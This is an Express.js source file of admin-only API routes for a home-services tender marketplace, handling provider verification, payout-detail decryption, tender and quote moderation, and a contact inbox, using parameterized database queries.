const express = require('express');
const path = require('path');
const db = require('../db');
const supabase = require('../lib/supabaseClient');
const { authenticate, authorize } = require('../middleware/auth');
const {
  sendProviderApprovedEmail,
  sendProviderRejectedEmail,
} = require('../lib/verificationEmails');
const { notifyUser, notifyChannel } = require('../lib/realtimeService');
const { sendTenderRemovedEmail } = require('../lib/tenderEmails');
const { signedUrl } = require('../lib/storageUrls');
const { getSessionDecision } = require('../lib/didit');
const {
  sendDisputeResolvedClientEmail,
  sendDisputeResolvedProviderEmail,
} = require('../lib/disputeEmails');
const { jamaicaToday } = require('../lib/feeConfig');
const paymentCrypto = require('../lib/paymentCrypto');

const router = express.Router();

// All admin routes require an authenticated admin.
router.use(authenticate, authorize('admin'));

// The four known document slots. gov_id is required; the rest are optional.
const DOC_TYPES = [
  { docType: 'gov_id',       name: 'Government ID',          required: true  },
  { docType: 'trade_cert',   name: 'Trade Certificate',      required: false },
  { docType: 'insurance',    name: 'Insurance',              required: false },
  { docType: 'business_reg', name: 'Business Registration',  required: false },
];
const VALID_DOC_TYPES = DOC_TYPES.map(d => d.docType);

// Map a file extension to a coarse content type so the frontend can pick
// <img> vs <iframe> for previewing.
const contentTypeForPath = (p) => {
  const ext = path.extname(p || '').toLowerCase();
  if (ext === '.pdf') return 'application/pdf';
  if (ext === '.png') return 'image/png';
  if (ext === '.jpg' || ext === '.jpeg') return 'image/jpeg';
  if (ext === '.webp') return 'image/webp';
  if (ext === '.gif') return 'image/gif';
  return 'application/octet-stream';
};

// ============================================================
// GET /api/admin/verifications
// All submitted providers (is_onboarding_complete = TRUE) with their
// profile, services, parishes, and a derived docs[] array.
// Read via db.query (superuser) — route already gated by authorize('admin').
// ============================================================
router.get('/verifications', async (req, res) => {
  try {
    const result = await db.query(`
      SELECT
        u.id            AS provider_id,
        u.first_name,
        u.last_name,
        u.email,
        u.phone_number,
        u.parish        AS home_parish,
        p.bio,
        p.verification_status,
        p.didit_status,
        p.didit_document_type,
        p.didit_check_summary,
        p.didit_verified_at,
        p.documents,
        -- Use the latest submission (resubmission wins) so the SLA clock resets.
        COALESCE(p.resubmitted_at, p.submitted_at) AS submitted_at,
        p.resubmitted_at,
        p.rejection_reason,
        p.rejection_notes,
        p.admin_notes,
        COALESCE(
          (SELECT json_agg(COALESCE(st.display_name, ps.category::text) ORDER BY ps.created_at)
             FROM public.provider_services ps
             LEFT JOIN public.service_types st ON st.slug = ps.category::text
            WHERE ps.provider_id = u.id),
          '[]'::json
        ) AS services,
        COALESCE(
          (SELECT json_agg(pa.parish ORDER BY pa.created_at)
             FROM public.provider_parishes pa
            WHERE pa.provider_id = u.id),
          '[]'::json
        ) AS parishes,
        EXISTS (
          SELECT 1 FROM public.provider_payment_details pd
           WHERE pd.provider_id = u.id AND pd.account_number_encrypted IS NOT NULL
        ) AS has_payment_details
      FROM public.provider_profiles p
      JOIN public.users u ON u.id = p.provider_id
      WHERE p.is_onboarding_complete = TRUE
      ORDER BY COALESCE(p.resubmitted_at, p.submitted_at) ASC NULLS LAST
    `);

    const providers = result.rows.map((r) => {
      const docs = r.documents || {};
      return {
        providerId:         r.provider_id,
        name:               `${r.first_name || ''} ${r.last_name || ''}`.trim() || 'Unnamed Provider',
        firstName:          r.first_name,
        email:              r.email,
        phone:              r.phone_number || '',
        parish:             (Array.isArray(r.parishes) && r.parishes[0]) || r.home_parish || '—',
        coverageParishes:   Array.isArray(r.parishes) ? r.parishes : [],
        cats:               Array.isArray(r.services) ? r.services : [],
        bio:                r.bio || '',
        verification_status: r.verification_status,
        // Independent automated signal from Didit (ID + liveness + face-match) —
        // separate from verification_status, which is the manual admin review.
        diditStatus:        r.didit_status,
        diditDocumentType:  r.didit_document_type,
        diditCheckSummary:  r.didit_check_summary,
        diditVerifiedAt:    r.didit_verified_at,
        submittedAt:        r.submitted_at,
        rejectionReason:    r.rejection_reason,
        rejectionNotes:     r.rejection_notes,
        // A pending application that carries a prior rejection reason is a
        // resubmission — the admin sees why it was rejected last time.
        previouslyRejected: Boolean(r.resubmitted_at) && Boolean(r.rejection_reason),
        adminNotes:         r.admin_notes || '',
        hasPaymentDetails:  Boolean(r.has_payment_details),
        docs: DOC_TYPES.map(d => ({
          docType:  d.docType,
          name:     d.name,
          required: d.required,
          uploaded: Boolean(docs[d.docType]),
        })),
      };
    });

    res.json({ success: true, providers });
  } catch (err) {
    console.error('GET /api/admin/verifications error:', err);
    res.status(500).json({ success: false, message: 'Failed to load verifications.' });
  }
});

// ============================================================
// GET /api/admin/verifications/unread-count?since=<unix_ms>
// Returns count of pending verifications submitted after the given timestamp.
// Used by the sidebar badge to show how many are new since the admin last
// viewed the verification page. `since` is milliseconds since epoch (from
// localStorage). Defaults to 0 (count all pending) if omitted or invalid.
// IMPORTANT: must be declared before /:providerId routes to avoid that param
// matching the literal string "unread-count".
// ============================================================
router.get('/verifications/unread-count', async (req, res) => {
  try {
    const sinceMs = parseInt(req.query.since, 10);
    const since = !isNaN(sinceMs) && sinceMs > 0 ? new Date(sinceMs) : new Date(0);

    const result = await db.query(
      `SELECT COUNT(*)::int AS count
         FROM public.provider_profiles pp
        WHERE pp.is_onboarding_complete = TRUE
          AND pp.verification_status    = 'pending'
          AND COALESCE(pp.resubmitted_at, pp.submitted_at) > $1`,
      [since]
    );

    res.json({ success: true, count: result.rows[0].count });
  } catch (err) {
    console.error('GET /api/admin/verifications/unread-count error:', err);
    res.status(500).json({ success: false, count: 0 });
  }
});

// ============================================================
// GET /api/admin/verifications/:providerId/document/:docType
// Generate a short-lived signed URL for a private provider document.
// ============================================================
router.get('/verifications/:providerId/document/:docType', async (req, res) => {
  const { providerId, docType } = req.params;

  if (!VALID_DOC_TYPES.includes(docType)) {
    return res.status(400).json({ success: false, message: 'Invalid document type.' });
  }

  try {
    const result = await db.query(
      `SELECT documents FROM public.provider_profiles WHERE provider_id = $1`,
      [providerId]
    );

    const docs = result.rows[0]?.documents || {};
    const storagePath = docs[docType];
    if (!storagePath) {
      return res.status(404).json({ success: false, message: 'Document not uploaded.' });
    }

    const { data, error } = await supabase.storage
      .from('provider-documents')
      .createSignedUrl(storagePath, 3600); // 1 hour

    if (error || !data?.signedUrl) {
      console.error('createSignedUrl error:', error);
      return res.status(500).json({ success: false, message: 'Could not generate document link.' });
    }

    res.json({
      success: true,
      url: data.signedUrl,
      contentType: contentTypeForPath(storagePath),
    });
  } catch (err) {
    console.error('GET document signed-url error:', err);
    res.status(500).json({ success: false, message: 'Failed to load document.' });
  }
});

// ============================================================
// GET /api/admin/verifications/:providerId/payment
// Returns the provider's FULL, decrypted payout details for verification.
// Decryption happens on-demand (only when an admin explicitly opens the
// banking panel) to minimise how often plaintext exists in memory.
// Admin-only (router.use gate). Read via superuser db.query.
// ============================================================
router.get('/verifications/:providerId/payment', async (req, res) => {
  const { providerId } = req.params;
  try {
    const result = await db.query(
      `SELECT account_ownership, business_name, payee_first_name, middle_initial, payee_surname,
              recipient_id,
              contact_address_line1, contact_address_line2, contact_address_line3,
              contact_city, contact_country, contact_state, contact_zip,
              contact_phone, contact_email,
              bank_name, bank_branch, swift_code, transit_code, bank_address,
              bank_city, bank_country, bank_state, bank_zip,
              account_type, currency, account_number_encrypted, aba_routing_encrypted
         FROM public.provider_payment_details
        WHERE provider_id = $1`,
      [providerId]
    );

    const r = result.rows[0];
    if (!r) {
      return res.status(404).json({ success: false, message: 'No payment details on file.' });
    }

    let accountNumber = null;
    let abaRouting = null;
    try {
      accountNumber = paymentCrypto.decrypt(r.account_number_encrypted);
      abaRouting = paymentCrypto.decrypt(r.aba_routing_encrypted);
    } catch (decErr) {
      console.error('Payment decrypt failed for provider', providerId, decErr.message);
      return res.status(500).json({
        success: false,
        message: 'Could not decrypt payment details. Check PAYMENT_ENCRYPTION_KEY.',
      });
    }

    res.json({
      success: true,
      payment: {
        accountOwnership: r.account_ownership,
        businessName:     r.business_name,
        payeeFirstName:   r.payee_first_name,
        middleInitial:    r.middle_initial,
        payeeSurname:     r.payee_surname,
        recipientId:      r.recipient_id,
        contactAddressLine1: r.contact_address_line1,
        contactAddressLine2: r.contact_address_line2,
        contactAddressLine3: r.contact_address_line3,
        contactCity:      r.contact_city,
        contactCountry:   r.contact_country,
        contactState:     r.contact_state,
        contactZip:       r.contact_zip,
        contactPhone:     r.contact_phone,
        contactEmail:     r.contact_email,
        bankName:         r.bank_name,
        bankBranch:       r.bank_branch,
        swiftCode:        r.swift_code,
        transitCode:      r.transit_code,
        bankAddress:      r.bank_address,
        bankCity:         r.bank_city,
        bankCountry:      r.bank_country,
        bankState:        r.bank_state,
        bankZip:          r.bank_zip,
        accountType:      r.account_type,
        currency:         r.currency,
        accountNumber,   // decrypted
        abaRouting,      // decrypted (may be null)
      },
    });
  } catch (err) {
    console.error('GET /api/admin/verifications/:providerId/payment error:', err);
    res.status(500).json({ success: false, message: 'Failed to load payment details.' });
  }
});

// ============================================================
// GET /api/admin/verifications/:providerId/identity-images
// Fetches the provider's Didit-submitted ID document images (front, back,
// portrait) LIVE from Didit's API for on-demand viewing. Nothing is ever
// written to our DB — Didit returns fresh short-lived signed S3 URLs on
// every call, matching the same "reveal on demand" pattern as the payment
// decrypt route above.
// ============================================================
router.get('/verifications/:providerId/identity-images', async (req, res) => {
  const { providerId } = req.params;
  try {
    const result = await db.query(
      `SELECT didit_session_id FROM public.provider_profiles WHERE provider_id = $1`,
      [providerId]
    );

    const sessionId = result.rows[0]?.didit_session_id;
    if (!sessionId) {
      return res.status(404).json({ success: false, message: 'Provider has not started identity verification.' });
    }

    const decision = await getSessionDecision(sessionId);
    const idVerification = decision?.id_verifications?.[0];
    if (!idVerification) {
      return res.status(404).json({ success: false, message: 'No ID document images available for this session yet.' });
    }

    res.json({
      success: true,
      documentType: idVerification.document_type ?? null,
      images: {
        front:    idVerification.full_front_image || idVerification.front_image || null,
        back:     idVerification.full_back_image || idVerification.back_image || null,
        portrait: idVerification.portrait_image || null,
      },
    });
  } catch (err) {
    console.error(`GET identity-images error for provider ${providerId}:`, err.message);
    res.status(500).json({ success: false, message: 'Could not load identity document images from Didit.' });
  }
});

// ============================================================
// POST /api/admin/verifications/:providerId/approve   body: { note? }
// ============================================================
router.post('/verifications/:providerId/approve', async (req, res) => {
  const { providerId } = req.params;
  const { note } = req.body;

  try {
    const result = await db.queryAsUser(req.user.id,
      `UPDATE public.provider_profiles
          SET verification_status = 'approved',
              is_verified         = TRUE,
              reviewed_at         = NOW(),
              reviewed_by         = $2,
              admin_notes         = COALESCE($3, admin_notes),
              updated_at          = NOW()
        WHERE provider_id = $1
        RETURNING provider_id`,
      [providerId, req.user.id, note ?? null]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Provider not found.' });
    }

    // Fetch contact details for the email (superuser read).
    const userRes = await db.query(
      `SELECT email, first_name FROM public.users WHERE id = $1`,
      [providerId]
    );
    const u = userRes.rows[0];
    if (u?.email) {
      try {
        await sendProviderApprovedEmail(u.email, u.first_name, note);
      } catch (mailErr) {
        console.warn('Approval email failed:', mailErr.message);
      }
    }

    await notifyUser(providerId, 'verification-approved', {
      message: 'Your account has been approved! You can now receive jobs.',
    });

    res.json({ success: true, verification_status: 'approved' });
  } catch (err) {
    console.error('POST approve error:', err);
    res.status(500).json({ success: false, message: 'Failed to approve provider.' });
  }
});

// ============================================================
// POST /api/admin/verifications/:providerId/reject   body: { reason, notes? }
// ============================================================
router.post('/verifications/:providerId/reject', async (req, res) => {
  const { providerId } = req.params;
  const { reason, notes } = req.body;

  if (!reason || !String(reason).trim()) {
    return res.status(400).json({ success: false, message: 'A rejection reason is required.' });
  }

  try {
    // Append this rejection to the immutable history trail (so prior reasons
    // survive future resubmissions/re-reviews), and set the latest reason/notes.
    const result = await db.queryAsUser(req.user.id,
      `UPDATE public.provider_profiles
          SET verification_status = 'rejected',
              is_verified         = FALSE,
              reviewed_at         = NOW(),
              reviewed_by         = $2,
              rejection_reason    = $3,
              rejection_notes     = $4,
              verification_history = COALESCE(verification_history, '[]'::jsonb)
                || jsonb_build_array(jsonb_build_object(
                     'action', 'rejected',
                     'reason', $3::text,
                     'notes',  $4::text,
                     'at',     NOW(),
                     'by',     $2::uuid
                   )),
              updated_at          = NOW()
        WHERE provider_id = $1
        RETURNING provider_id`,
      [providerId, req.user.id, reason, notes ?? null]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Provider not found.' });
    }

    const userRes = await db.query(
      `SELECT email, first_name FROM public.users WHERE id = $1`,
      [providerId]
    );
    const u = userRes.rows[0];
    if (u?.email) {
      try {
        await sendProviderRejectedEmail(u.email, u.first_name, reason, notes);
      } catch (mailErr) {
        console.warn('Rejection email failed:', mailErr.message);
      }
    }

    await notifyUser(providerId, 'verification-rejected', {
      message: 'Your verification was not approved. Check your email for details.',
      reason,
    });

    res.json({ success: true, verification_status: 'rejected' });
  } catch (err) {
    console.error('POST reject error:', err);
    res.status(500).json({ success: false, message: 'Failed to reject provider.' });
  }
});

// ============================================================
// PUT /api/admin/verifications/:providerId/note   body: { admin_notes }
// Persist internal review notes (never emailed to the provider).
// ============================================================
router.put('/verifications/:providerId/note', async (req, res) => {
  const { providerId } = req.params;
  const { admin_notes } = req.body;

  try {
    const result = await db.queryAsUser(req.user.id,
      `UPDATE public.provider_profiles
          SET admin_notes = $2, updated_at = NOW()
        WHERE provider_id = $1
        RETURNING provider_id`,
      [providerId, admin_notes ?? null]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Provider not found.' });
    }

    res.json({ success: true });
  } catch (err) {
    console.error('PUT note error:', err);
    res.status(500).json({ success: false, message: 'Failed to save note.' });
  }
});

// ============================================================
// Admin Tender Management
// Read via db.query (superuser) — route already gated by authorize('admin').
// Tenders are addressed by their human-readable display_code (TND-####).
// ============================================================

// Prettify a raw service_category slug as a fallback title/label.
const prettifyCat = (c) =>
  (c || 'other').split('_').map((w) => w.charAt(0).toUpperCase() + w.slice(1)).join(' ');

// DB status + flags -> admin display status.
const toAdminStatus = (row) => {
  if (row.status === 'completed') return 'completed';
  if (row.has_accepted || row.status === 'in_progress') return 'awarded';
  if (row.is_expired) return 'expired';
  return 'active';
};

const QUOTE_STATUS_MAP = { pending: 'pending', accepted: 'awarded', rejected: 'rejected' };

const monthYear = (d) =>
  d ? new Date(d).toLocaleString('en-US', { month: 'short', year: 'numeric' }) : '';
const isoDate = (d) => (d ? new Date(d).toISOString().slice(0, 10) : undefined);

// Ping every provider who quoted a tender so their "My Quotes" list re-fetches
// (their quote is hidden while the tender is trashed, and returns on restore).
async function notifyQuoteProviders(tenderId) {
  const r = await db.query('SELECT DISTINCT provider_id FROM public.quotes WHERE tender_id = $1', [tenderId]);
  await Promise.allSettled(
    r.rows.map((row) => notifyUser(row.provider_id, 'quotes-updated', { tenderId }))
  );
}

// GET /api/admin/tenders — every non-draft tender in the AdminTender shape.
router.get('/tenders', async (req, res) => {
  try {
    const tRes = await db.query(`
      SELECT
        t.id AS uuid, t.display_code, t.description, t.category,
        st.display_name AS service_name,
        t.parish, t.budget_min, t.budget_max,
        t.created_at, t.preferred_start_date, t.expires_at, t.updated_at,
        t.status, t.trashed_at,
        (t.expires_at IS NOT NULL AND t.expires_at <= NOW()) AS is_expired,
        EXISTS (SELECT 1 FROM public.quotes q WHERE q.tender_id = t.id AND q.status = 'accepted') AS has_accepted,
        -- transactions.tender_id is ON DELETE RESTRICT (protects financial
        -- records) — any tender with one CANNOT be hard-deleted. Surfaced so
        -- the admin UI can disable that action instead of letting it fail.
        EXISTS (SELECT 1 FROM public.transactions tx WHERE tx.tender_id = t.id) AS has_transaction,
        cu.first_name, cu.last_name, cu.email,
        cu.display_code AS client_code, cu.created_at AS client_since
      FROM public.tenders t
      LEFT JOIN public.service_types st ON st.id = t.service_type_id
      JOIN public.users cu ON cu.id = t.client_id
      WHERE t.status <> 'draft'
      ORDER BY t.created_at DESC
    `);

    const uuids = tRes.rows.map((r) => r.uuid);
    const quotesByTender = new Map();
    if (uuids.length) {
      const qRes = await db.query(`
        SELECT q.id, q.tender_id, q.amount, q.status, q.created_at,
               pu.display_code AS provider_code, pu.first_name, pu.last_name,
               -- transactions.quote_id is ON DELETE RESTRICT (same reasoning
               -- as tenders.tender_id above) — a quote with one can never be
               -- hard-deleted, even while itself still 'pending' (a
               -- transaction row now exists from the moment WiPay checkout
               -- is INITIATED, before the quote is marked accepted).
               EXISTS (SELECT 1 FROM public.transactions tx WHERE tx.quote_id = q.id) AS has_transaction
        FROM public.quotes q
        JOIN public.users pu ON pu.id = q.provider_id
        WHERE q.tender_id = ANY($1::uuid[])
        ORDER BY q.created_at ASC
      `, [uuids]);
      for (const q of qRes.rows) {
        if (!quotesByTender.has(q.tender_id)) quotesByTender.set(q.tender_id, []);
        quotesByTender.get(q.tender_id).push(q);
      }
    }

    const tenders = tRes.rows.map((r) => {
      const rawQuotes = quotesByTender.get(r.uuid) || [];
      const quotes = rawQuotes.map((q) => ({
        pid:    q.provider_code,
        name:   `${q.first_name} ${q.last_name}`.trim(),
        amount: Math.round((q.amount || 0) / 100),
        date:   isoDate(q.created_at),
        status: QUOTE_STATUS_MAP[q.status] || 'pending',
        hasTransaction: q.has_transaction,
      }));
      const accepted = rawQuotes.find((q) => q.status === 'accepted');

      return {
        id:     r.display_code,
        title:  r.service_name || prettifyCat(r.category),
        cat:    r.category,
        desc:   r.description || '',
        client: {
          name:  `${r.first_name} ${r.last_name}`.trim(),
          email: r.email,
          id:    r.client_code,
          since: monthYear(r.client_since),
        },
        location:   r.parish,
        budget_min: Math.round((r.budget_min || 0) / 100),
        budget_max: Math.round((r.budget_max || 0) / 100),
        posted:     isoDate(r.created_at),
        deadline:   isoDate(r.expires_at),
        status:     toAdminStatus(r),
        quotes,
        awarded_to: accepted
          ? { pid: accepted.provider_code, name: `${accepted.first_name} ${accepted.last_name}`.trim(), amount: Math.round((accepted.amount || 0) / 100) }
          : undefined,
        completed_date: r.status === 'completed' ? isoDate(r.updated_at) : undefined,
        trashed: r.trashed_at !== null,
        hasTransaction: r.has_transaction,
      };
    });

    res.json({ success: true, tenders });
  } catch (err) {
    console.error('GET /api/admin/tenders error:', err);
    res.status(500).json({ success: false, message: 'Failed to load tenders.' });
  }
});

// GET /api/admin/tenders/active-count — count of live "Active" tenders for the
// sidebar badge (open, not admin-removed, not expired, not yet awarded) — mirrors
// the Active/Live bucket on the admin Tenders page.
router.get('/tenders/active-count', async (req, res) => {
  try {
    const r = await db.query(`
      SELECT COUNT(*)::int AS count
      FROM public.tenders t
      WHERE t.status = 'open'
        AND t.trashed_at IS NULL
        AND (t.expires_at IS NULL OR t.expires_at > NOW())
        AND NOT EXISTS (SELECT 1 FROM public.quotes q WHERE q.tender_id = t.id AND q.status = 'accepted')
    `);
    res.json({ success: true, count: r.rows[0].count });
  } catch (err) {
    console.error('GET /api/admin/tenders/active-count error:', err);
    res.status(500).json({ success: false, message: 'Failed to count tenders.' });
  }
});

// POST /api/admin/tenders/:code/trash — soft-delete (hides from browse/explore
// and marks the homeowner's copy "Rejected by admin"). Optional { reason }.
router.post('/tenders/:code/trash', async (req, res) => {
  const reason = (req.body && typeof req.body.reason === 'string')
    ? req.body.reason.trim().slice(0, 500) || null
    : null;
  try {
    const r = await db.query(
      `UPDATE public.tenders
         SET trashed_at = NOW(), trashed_reason = $2, updated_at = NOW()
       WHERE display_code = $1
       RETURNING id, client_id, display_code,
                 (SELECT display_name FROM public.service_types WHERE id = service_type_id) AS service_name,
                 category,
                 (SELECT email      FROM public.users WHERE id = client_id) AS client_email,
                 (SELECT first_name FROM public.users WHERE id = client_id) AS client_name`,
      [req.params.code, reason]
    );
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Tender not found.' });
    res.json({ success: true });

    // Fire-and-forget: tell the homeowner their tender was removed.
    const t = r.rows[0];
    const label = t.service_name || t.category || 'your tender';
    Promise.allSettled([
      notifyUser(t.client_id, 'tender-removed', { tenderId: t.id, displayCode: t.display_code, reason }),
      // Email the homeowner.
      t.client_email
        ? sendTenderRemovedEmail(t.client_email, { clientName: t.client_name, tenderTitle: label, tenderCode: t.display_code, reason })
        : Promise.resolve(),
      notifyUser(t.client_id, 'tenders-updated', { tenderId: t.id }),
      db.query(
        `INSERT INTO public.notifications (user_id, type, title, body, data)
         VALUES ($1, 'tender_removed', $2, $3, $4::jsonb)`,
        [
          t.client_id,
          'Your tender was removed',
          `An administrator removed your "${label}" tender (${t.display_code}).` + (reason ? ` Reason: ${reason}` : ''),
          JSON.stringify({ tenderId: t.id }),
        ]
      ),
      // Refresh the My Quotes list of every provider who quoted — their quote is now hidden.
      notifyQuoteProviders(t.id),
      // Drop it from every provider's Browse grid + recount their stats, live.
      notifyChannel('tenders-feed', 'tender-removed', { tenderId: t.id }),
    ]).catch((err) => console.warn('trash notify error:', err.message));
  } catch (err) {
    console.error('POST /api/admin/tenders/:code/trash error:', err);
    res.status(500).json({ success: false, message: 'Failed to trash tender.' });
  }
});

// POST /api/admin/tenders/:code/restore — undo soft-delete + clear the reason.
router.post('/tenders/:code/restore', async (req, res) => {
  try {
    const r = await db.query(
      `UPDATE public.tenders
         SET trashed_at = NULL, trashed_reason = NULL, updated_at = NOW()
       WHERE display_code = $1
       RETURNING id, client_id, display_code,
                 (SELECT display_name FROM public.service_types WHERE id = service_type_id) AS service_name,
                 category`,
      [req.params.code]
    );
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Tender not found.' });
    res.json({ success: true });

    const t = r.rows[0];
    const label = t.service_name || t.category || 'your tender';
    Promise.allSettled([
      notifyUser(t.client_id, 'tenders-updated', { tenderId: t.id }),
      db.query(
        `INSERT INTO public.notifications (user_id, type, title, body, data)
         VALUES ($1, 'tender_restored', $2, $3, $4::jsonb)`,
        [
          t.client_id,
          'Your tender was restored',
          `An administrator restored your "${label}" tender (${t.display_code}). It is live again.`,
          JSON.stringify({ tenderId: t.id }),
        ]
      ),
      // Refresh My Quotes for providers who quoted — their quote is visible again.
      notifyQuoteProviders(t.id),
      // Re-add it to providers' Browse grids + recount, live.
      notifyChannel('tenders-feed', 'tender-restored', { tenderId: t.id }),
    ]).catch((err) => console.warn('restore notify error:', err.message));
  } catch (err) {
    console.error('POST /api/admin/tenders/:code/restore error:', err);
    res.status(500).json({ success: false, message: 'Failed to restore tender.' });
  }
});

// ============================================================
// PATCH /api/admin/tenders/:code/status   body: { status }
// Manual admin override of a tender's lifecycle status. Restricted to the
// real tender_status enum values (open | in_progress | completed) — the
// frontend used to offer "Awarded"/"Expired"/"Cancelled" as well, but those
// were carried over from the original static mockup and never corresponded
// to anything in the schema; "expired" is a derived property of expires_at,
// not a stored state, and there is no "cancelled" concept — an admin who
// wants a tender gone uses Trash instead.
// ============================================================
const VALID_TENDER_STATUSES = ['open', 'in_progress', 'completed'];

router.patch('/tenders/:code/status', async (req, res) => {
  const { status } = req.body;
  if (!VALID_TENDER_STATUSES.includes(status)) {
    return res.status(400).json({ success: false, message: `Status must be one of: ${VALID_TENDER_STATUSES.join(', ')}.` });
  }
  try {
    const r = await db.query(
      `UPDATE public.tenders SET status = $2, updated_at = NOW()
       WHERE display_code = $1
       RETURNING id, client_id, display_code`,
      [req.params.code, status]
    );
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Tender not found.' });

    res.json({ success: true, status });

    // Live-refresh anyone looking at this tender (provider Browse, homeowner
    // dashboard) — no email, this is an admin data-correction tool, not a
    // customer-facing lifecycle event like trash/restore.
    const t = r.rows[0];
    Promise.allSettled([
      notifyUser(t.client_id, 'tenders-updated', { tenderId: t.id }),
      notifyChannel('tenders-feed', 'tender-status-changed', { tenderId: t.id, status }),
    ]).catch((err) => console.warn('status-change notify error:', err.message));
  } catch (err) {
    console.error('PATCH /api/admin/tenders/:code/status error:', err);
    res.status(500).json({ success: false, message: 'Failed to update tender status.' });
  }
});

// DELETE /api/admin/tenders/:code — permanent delete (cascades quotes + photos).
// Blocked by Postgres (23503 foreign_key_violation) if a transaction row
// references this tender — that FK is ON DELETE RESTRICT specifically to
// protect financial records, so we never bypass it; we just explain it.
// The frontend should already prevent this by disabling delete when
// hasTransaction is true (see GET /tenders), so hitting this is the backstop.
router.delete('/tenders/:code', async (req, res) => {
  try {
    const r = await db.query(
      `DELETE FROM public.tenders WHERE display_code = $1 RETURNING id`,
      [req.params.code]
    );
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Tender not found.' });
    res.json({ success: true });
  } catch (err) {
    if (err.code === '23503') {
      console.warn(`DELETE /api/admin/tenders/:code blocked by FK (has transaction history): ${req.params.code}`);
      return res.status(409).json({
        success: false,
        message: 'This tender has payment/transaction history and cannot be permanently deleted, to protect financial records. Use Trash to remove it from view instead.',
      });
    }
    console.error('DELETE /api/admin/tenders/:code error:', err);
    res.status(500).json({ success: false, message: 'Failed to delete tender.' });
  }
});

// DELETE /api/admin/tenders/:code/quotes/:pid — remove a single quote (by provider code).
// One quote per (tender, provider) — uq_quotes_tender_provider — so this is unambiguous.
// Blocked by Postgres (23503) if a transaction references this quote — same
// ON DELETE RESTRICT protection as the tender delete above. The frontend
// should already prevent this via the quote's hasTransaction flag; this is
// the backstop with an honest message instead of a generic 500.
router.delete('/tenders/:code/quotes/:pid', async (req, res) => {
  try {
    const del = await db.query(`
      DELETE FROM public.quotes
      WHERE tender_id   = (SELECT id FROM public.tenders WHERE display_code = $1)
        AND provider_id = (SELECT id FROM public.users   WHERE display_code = $2)
      RETURNING tender_id
    `, [req.params.code, req.params.pid]);
    if (del.rows.length === 0) return res.status(404).json({ success: false, message: 'Quote not found.' });
    // Keep the denormalised counter honest.
    await db.query(
      `UPDATE public.tenders SET quotes_count = (SELECT COUNT(*) FROM public.quotes WHERE tender_id = $1)
       WHERE id = $1`,
      [del.rows[0].tender_id]
    );
    res.json({ success: true });
  } catch (err) {
    if (err.code === '23503') {
      console.warn(`DELETE /api/admin/tenders/:code/quotes/:pid blocked by FK (has transaction history): ${req.params.code}/${req.params.pid}`);
      return res.status(409).json({
        success: false,
        message: 'This quote has payment history (a checkout was started on it) and cannot be removed, to protect financial records.',
      });
    }
    console.error('DELETE /api/admin/tenders/:code/quotes/:pid error:', err);
    res.status(500).json({ success: false, message: 'Failed to remove quote.' });
  }
});

// ============================================================
// Admin Contact Inbox
// Reads/writes public.contact_messages. The public form stores the subject
// as the exact <option> label text (see tendrlt-fe/app/contact/page.tsx);
// we map that + the homeowner/provider/other role onto the admin UI's enums.
// ============================================================

const CONTACT_ROLE_MAP = { homeowner: 'client', provider: 'provider' };
const toContactRole = (r) => CONTACT_ROLE_MAP[r] || 'other';

const CONTACT_SUBJECT_MAP = {
  'Problem with a quote': 'quote',
  'Payment or escrow issue': 'payment',
  'Provider verification': 'verification',
  'Account access': 'account',
  'Report a user': 'report',
  'Feature request': 'feature',
  'General question': 'question',
  'Other': 'other',
};
const toContactSubject = (s) => CONTACT_SUBJECT_MAP[s] || 'other';

const INBOX_STATUSES = ['new', 'read', 'resolved', 'archived'];

const shapeContactMessage = (r) => ({
  id: r.id,
  fn: r.first_name,
  ln: r.last_name || '',
  email: r.email,
  role: toContactRole(r.role),
  subject: toContactSubject(r.subject),
  msg: r.message,
  date: r.created_at.toISOString().slice(0, 10),
  status: r.status,
  trashed: r.trashed,
});

// GET /api/admin/contact-messages
router.get('/contact-messages', async (req, res) => {
  try {
    const r = await db.query(`
      SELECT id, first_name, last_name, email, role, subject, message, status, trashed, created_at
      FROM public.contact_messages
      ORDER BY created_at DESC
    `);
    res.json({ success: true, items: r.rows.map(shapeContactMessage) });
  } catch (err) {
    console.error('GET /api/admin/contact-messages error:', err);
    res.status(500).json({ success: false, message: 'Failed to load contact messages.' });
  }
});

// PATCH /api/admin/contact-messages/:id/status   body: { status }
router.patch('/contact-messages/:id/status', async (req, res) => {
  const { status } = req.body || {};
  if (!INBOX_STATUSES.includes(status)) {
    return res.status(400).json({ success: false, message: 'Invalid status.' });
  }
  try {
    const r = await db.query(
      `UPDATE public.contact_messages SET status = $2 WHERE id = $1 RETURNING id`,
      [req.params.id, status]
    );
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Message not found.' });
    res.json({ success: true });
  } catch (err) {
    console.error('PATCH /api/admin/contact-messages/:id/status error:', err);
    res.status(500).json({ success: false, message: 'Failed to update status.' });
  }
});

// POST /api/admin/contact-messages/:id/trash
router.post('/contact-messages/:id/trash', async (req, res) => {
  try {
    const r = await db.query(
      `UPDATE public.contact_messages SET trashed = true WHERE id = $1 RETURNING id`,
      [req.params.id]
    );
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Message not found.' });
    res.json({ success: true });
  } catch (err) {
    console.error('POST /api/admin/contact-messages/:id/trash error:', err);
    res.status(500).json({ success: false, message: 'Failed to trash message.' });
  }
});

// POST /api/admin/contact-messages/:id/restore
router.post('/contact-messages/:id/restore', async (req, res) => {
  try {
    const r = await db.query(
      `UPDATE public.contact_messages SET trashed = false WHERE id = $1 RETURNING id`,
      [req.params.id]
    );
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Message not found.' });
    res.json({ success: true });
  } catch (err) {
    console.error('POST /api/admin/contact-messages/:id/restore error:', err);
    res.status(500).json({ success: false, message: 'Failed to restore message.' });
  }
});

// DELETE /api/admin/contact-messages/:id
router.delete('/contact-messages/:id', async (req, res) => {
  try {
    const r = await db.query(`DELETE FROM public.contact_messages WHERE id = $1 RETURNING id`, [req.params.id]);
    if (r.rows.length === 0) return res.status(404).json({ success: false, message: 'Message not found.' });
    res.json({ success: true });
  } catch (err) {
    console.error('DELETE /api/admin/contact-messages/:id error:', err);
    res.status(500).json({ success: false, message: 'Failed to delete message.' });
  }
});

// ============================================================
